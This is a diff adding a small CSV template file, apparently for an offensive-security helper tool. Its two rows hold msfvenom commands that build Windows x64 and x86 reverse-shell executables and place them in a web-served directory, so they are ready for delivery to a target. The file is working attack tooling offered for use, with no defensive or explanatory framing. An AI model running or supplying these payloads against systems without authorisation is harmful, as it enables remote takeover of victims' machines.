@@ -1,0 +1,3 @@
+name,description,command,path,restart
+SRevTcpWin64Exe,Reverse shell via tcp as exe for windows x64,msfvenom -p windows/x64/shell_reverse_tcp LHOST=###LocalHost### LPORT=###LocalPort### -f exe -o ###HttpRootDir###revW64-###LocalHost###_###LocalPort###.exe,###HttpRootDir###,false
+SRevTcpWinExe,Reverse shell via tcp as exe for windows,msfvenom -p windows/shell_reverse_tcp LHOST=###LocalHost### LPORT=###LocalPort### -f exe -o ###HttpRootDir###revW-###LocalHost###_###LocalPort###.exe,###HttpRootDir###,false
